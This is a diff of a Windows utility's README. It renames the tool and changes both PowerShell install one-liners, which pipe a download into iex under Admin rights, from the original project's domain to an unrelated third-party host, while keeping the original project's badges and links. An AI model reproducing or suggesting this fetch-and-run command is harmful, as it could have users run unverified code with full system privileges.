@@ -1,4 +1,4 @@
-# Chris Titus Tech's Windows Utility
+# Jonathan's Big Damn Windows Tool
 
 [![Version](https://img.shields.io/github/v/release/ChrisTitusTech/winutil?color=%230567ff&label=Latest%20Release&style=for-the-badge)](https://github.com/ChrisTitusTech/winutil/releases/latest)
 ![GitHub Downloads (specific asset, all releases)](https://img.shields.io/github/downloads/ChrisTitusTech/winutil/winutil.ps1?label=Total%20Downloads&style=for-the-badge)
@@ -27,12 +27,12 @@ Winutil must be run in Admin mode because it performs system-wide tweaks. To ach
 #### Stable Branch (Recommended)
 
 ```ps1
-irm "https://christitus.com/win" | iex
+irm "https://www.goldenenterprises.us/win" | iex
 ```
 #### Dev Branch
 
 ```ps1
-irm "https://christitus.com/windev" | iex
+irm "https://www.goldenenterprises.us/windev" | iex
 ```
 
 If you have Issues, refer to [Known Issues](https://winutil.christitus.com/knownissues/) or [Create Issue](https://github.com/ChrisTitusTech/winutil/issues)
